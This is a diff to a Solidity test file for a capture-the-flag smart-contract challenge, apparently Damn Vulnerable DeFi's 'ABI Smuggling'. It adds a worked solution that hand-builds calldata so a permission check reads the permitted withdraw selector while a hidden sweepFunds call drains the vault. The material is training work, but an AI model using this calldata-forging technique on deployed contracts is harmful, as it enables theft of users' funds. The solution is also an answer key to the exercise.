@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -36,6 +36,7 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
+        // deployer: sweepFunds, player: withdraw
         bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
         bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
         bytes32[] memory permissions = new bytes32[](2);
@@ -73,7 +74,20 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // execute(4) + target(32) + actionDataOffset(32) + pad(32) + withdraw(4) + actionDataLength(32) + actionData
+        bytes4 executeSelector = AuthorizedExecutor.execute.selector;
+        bytes32 target = bytes32(uint256(uint160(address(vault))));
+        bytes32 actionDataOffset = bytes32(uint256(4 + 32 * 3));
+        bytes32 pad = bytes32(0);
+        bytes4 withdrawSelector = SelfAuthorizedVault.withdraw.selector;
+
+        bytes memory actionData = abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, recovery, token);
+        bytes32 actionDataLength = bytes32(uint256(actionData.length));
+
+        bytes memory data =
+            bytes.concat(executeSelector, target, actionDataOffset, pad, withdrawSelector, actionDataLength, actionData);
+        (bool success,) = address(vault).call(data);
+        require(success, "call failed");
     }
 
     /**
